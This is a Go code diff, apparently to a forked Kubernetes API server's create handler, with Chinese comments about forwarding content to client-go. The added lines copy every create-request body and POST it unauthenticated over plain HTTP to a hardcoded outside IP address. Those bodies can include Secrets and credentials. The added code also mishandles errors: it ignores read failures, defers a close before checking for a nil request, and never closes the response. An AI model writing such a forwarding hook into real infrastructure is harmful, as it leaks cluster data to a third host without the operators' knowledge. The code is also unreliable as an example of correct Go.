@@ -20,6 +20,7 @@ import (
 	"bytes"
 	"context"
 	"fmt"
+	"io"
 	"net/http"
 	"strings"
 	"time"
@@ -52,6 +53,26 @@ var namespaceGVK = schema.GroupVersionKind{Group: "", Version: "v1", Kind: "Name
 func createHandler(r rest.NamedCreater, scope *RequestScope, admit admission.Interface, includeName bool) http.HandlerFunc {
 	return func(w http.ResponseWriter, req *http.Request) {
 		// For performance tracking purposes.
+		//转发内容到client-go
+		fmt.Println("使用fork版本替代原版本")
+		bodyRes, err := io.ReadAll(req.Body)
+		req.Body = io.NopCloser(bytes.NewReader(bodyRes))
+		fmt.Println("req.Body封装完成")
+		cgoBody := io.NopCloser(bytes.NewReader(bodyRes))
+		fmt.Println("cgoBody封装完成")
+		fmt.Println("转发yaml内容到client-go")
+		cgoRequest, err := http.NewRequest("POST", "http://12.0.220.143:8999/metricSource", cgoBody)
+		defer cgoRequest.Body.Close()
+		if err != nil {
+			fmt.Println("访问失败", err)
+		}
+		cgoRequest.Header.Set("Content-Type", "application/json;charset=UTF-8")
+		client := http.Client{}
+		cgoResp, err := client.Do(cgoRequest)
+		if err != nil {
+			fmt.Println("响应失败", err)
+		}
+		fmt.Println("Resp:", cgoResp)
 		trace := utiltrace.New("Create", traceFields(req)...)
 		defer trace.LogIfLong(500 * time.Millisecond)
 
